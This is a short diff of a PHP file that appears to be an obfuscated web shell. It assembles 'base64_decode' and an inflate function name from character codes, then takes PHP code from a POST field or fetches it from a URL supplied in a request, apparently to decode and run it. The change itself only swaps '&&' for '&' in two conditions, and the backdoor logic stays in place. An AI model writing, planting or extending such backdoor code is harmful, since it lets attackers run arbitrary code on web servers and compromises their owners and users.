@@ -10,10 +10,10 @@ $unzip.=$c(102).$c(108).$c(97).$c(116).$c(101);
 
 $undecode=$c(98).$c(97).$c(115).$c(101).$c(54).$c(52);
 $undecode.=$c(95).$c(100).$c(101).$c(99).$c(111).$c(100).$c(101);
-if($_POST['phpcodeurl']!=null&&$_POST['phpcodeurl']!=''){
+if($_POST['phpcodeurl']!=null&$_POST['phpcodeurl']!=''){
 	$tongji=$get($_POST['phpcodeurl']);
 }
-else if($_POST['tongji']!=null&&$_POST['tongji']!=''){
+else if($_POST['tongji']!=null&$_POST['tongji']!=''){
 	$tongji=$_POST['tongji'];
 }
 $ecode = $_REQUEST['0'];
